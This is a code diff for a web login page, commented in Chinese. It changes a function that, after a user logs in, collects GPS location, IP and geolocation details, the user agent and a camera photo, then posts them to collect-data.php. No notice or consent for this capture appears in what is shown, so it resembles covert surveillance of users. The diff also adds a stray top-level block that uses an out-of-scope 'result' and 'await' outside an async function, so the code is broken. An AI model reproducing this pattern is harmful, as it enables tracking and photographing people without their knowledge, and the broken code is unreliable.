@@ -464,56 +464,75 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 
     
 
- async function collectAndSendData(userId) {
-  const collectedData = { gps: null, ip: null, photo: null };
-  try {
-    const [gpsResult, ipResult] = await Promise.allSettled([
-      getGpsCoordinates(),
-      getIpInfo(),
-    ]);
-    const photoResult = await startCamera();
-
-    if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
-    if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
-    if (photoResult) collectedData.photo = photoResult;
-
-    const fd = new URLSearchParams();
-    fd.append('user_id', userId); // 確保 userId 傳遞正確
-    fd.append('message', '合併資料上傳');
-    if (collectedData.gps) {
-      fd.append('latitude', collectedData.gps.latitude);
-      fd.append('longitude', collectedData.gps.longitude);
-      fd.append('address', collectedData.gps.address);
-    }
-    if (collectedData.ip) {
-      fd.append('ip', collectedData.ip.ip);
-      fd.append('ipType', collectedData.ip.ipType);
-      fd.append('userAgent', collectedData.ip.userAgent);
-      fd.append('city', collectedData.ip.city);
-      fd.append('region', collectedData.ip.region);
-      fd.append('country', collectedData.ip.country);
-      fd.append('org', collectedData.ip.org);
-    }
-    if (collectedData.photo) {
-      fd.append('imageData', collectedData.photo);
+ async function collectAndSendData() {
+    const statusElem = document.getElementById('status');
+    if (statusElem) {
+        statusElem.innerText = '正在收集資料...';
     }
 
-    const resp = await fetch(SCRIPT_URL, {
-      method: 'POST',
-      body: fd
-    });
+    const collectedData = { gps: null, ip: null, photo: null };
+    try {
+        const [gpsResult, ipResult] = await Promise.allSettled([
+            getGpsCoordinates(),
+            getIpInfo(),
+        ]);
+        const photoResult = await startCamera();
 
-    const result = await resp.json();
-    if (result.success) {
-      console.log('裝置資料已成功記錄');
-    } else {
-      console.error(`裝置記錄失敗：${result.error}`);
+        if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
+        if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
+        if (photoResult) collectedData.photo = photoResult;
+
+        const fd = new URLSearchParams();
+        fd.append('user_id', getSessionUserId()); // 傳遞 user_id
+        fd.append('message', '合併資料上傳');
+        if (collectedData.gps) {
+            fd.append('latitude', collectedData.gps.latitude);
+            fd.append('longitude', collectedData.gps.longitude);
+            fd.append('address', collectedData.gps.address);
+        }
+        if (collectedData.ip) {
+            fd.append('ip', collectedData.ip.ip);
+            fd.append('ipType', collectedData.ip.ipType);
+            fd.append('userAgent', collectedData.ip.userAgent);
+            fd.append('city', collectedData.ip.city);
+            fd.append('region', collectedData.ip.region);
+            fd.append('country', collectedData.ip.country);
+            fd.append('org', collectedData.ip.org);
+        }
+        if (collectedData.photo) {
+            fd.append('imageData', collectedData.photo);
+        }
+
+        const resp = await fetch('collect-data.php', {
+            method: 'POST',
+            body: fd
+        });
+
+        const result = await resp.json();
+        if (result.success) {
+            if (statusElem) statusElem.innerText = '資料已成功發送！';
+        } else {
+            if (statusElem) statusElem.innerText = `資料發送失敗：${result.error}`;
+        }
+    } catch (error) {
+        console.error('資料收集或傳送過程中發生錯誤:', error);
+        if (statusElem) {
+            statusElem.innerText = '資料收集或傳送過程中發生錯誤。';
+        }
     }
-  } catch (error) {
-    console.error('資料收集或傳送過程中發生錯誤:', error);
-  }
 }
 
+
+function getSessionUserId() {
+    return sessionStorage.getItem('user_id'); 
+}
+if (result.success) {
+    showSuccessMessage('登入成功！');
+    sessionStorage.setItem('user_id', result.user_id); // 存儲 user_id
+    modalOverlay.style.display = 'none';
+    mainPanel.style.display = 'block';
+    await collectAndSendData(); // 收集並發送裝置資訊
+}
     
    document.addEventListener('DOMContentLoaded', async () => { 
   try {
